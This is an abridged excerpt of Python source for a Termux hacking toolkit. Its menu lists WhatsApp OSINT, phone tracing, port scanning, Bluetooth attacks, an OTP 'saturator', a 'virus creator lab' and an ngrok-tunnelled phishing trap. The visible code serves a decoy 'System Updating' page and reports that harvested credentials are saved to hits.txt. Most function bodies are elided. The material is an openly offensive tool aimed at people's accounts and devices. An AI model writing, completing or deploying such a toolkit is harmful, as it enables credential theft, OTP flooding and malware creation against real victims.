...
try:
    # Explicitly pointing to the Termux ngrok binary location
    conf.get_default().ngrok_path = "/data/data/com.termux/files/usr/bin/ngrok"
    conf.get_default().config_path = "/data/data/com.termux/files/home/.config/ngrok/ngrok.yml"
except:
    pass
    ...
    while True:
        ...
        if choice == "1":
            with open(name + ".sh", "w") as f:
                # Added 'r' to prevent SyntaxWarning
...
def phishing_page():
    ...
    return "<h1>System Updating...</h1><p>Please do not close this page.</p>"
...
def start_phishing():
    ...
    try:
        ...
        print(f"{G}[+] Tunnel Active! Credentials will be saved in hits.txt{W}")
        input(f"\n{Y}Press Enter to stop and return to menu...{W}")
...
def main():
    while True:
        ...
        print(f"  {G}1.{W} WHATSAPP OSINT")
        print(f"  {G}2.{W} PHONE TRACER")
        print(f"  {G}3.{W} IP TRACKER & PORT SCAN")
        print(f"  {G}4.{W} BLUETOOTH ATTACK")
        print(f"  {G}5.{W} OTP LOCK / SATURATOR")
        print(f"  {G}6.{W} VIRUS CREATOR LAB")
        print(f"  {G}7.{W} PHISHING TRAP (NGROK)")
        print(f"  {R}0. EXIT SYSTEM{W}")
